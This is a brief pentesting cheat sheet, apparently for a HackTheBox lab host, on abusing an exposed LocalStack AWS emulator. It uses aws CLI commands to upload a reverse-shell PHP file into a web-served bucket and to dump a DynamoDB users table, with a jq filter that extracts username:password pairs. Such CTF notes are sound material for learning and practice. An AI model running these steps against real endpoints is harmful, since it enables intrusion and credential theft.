[LocalStack](https://github.com/localstack/localstack)
## Test for non-null credentials
- Configure Creds to not be null with 
```bash
aws config
```

## Abuse Creds to get shell
- Login with the newly created creds
```bash
aws --endpoint-url http://s3.bucket.htb ls
```
- Copy reverse shell to pwd
```bash
aws --endpoint-url http://s3.bucket.htb cp rev.php s3://adserver/
```

## Enumerate dynamodb
- List tables
```bash
aws --endpoint-url http://s3.bucket.htb dynamodb list-tables
```
- Dump table
```bash
aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users
```
- Clean table output using jq
```bash
aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r '.Items[] | "\(.username[]):\(.password[])"'
```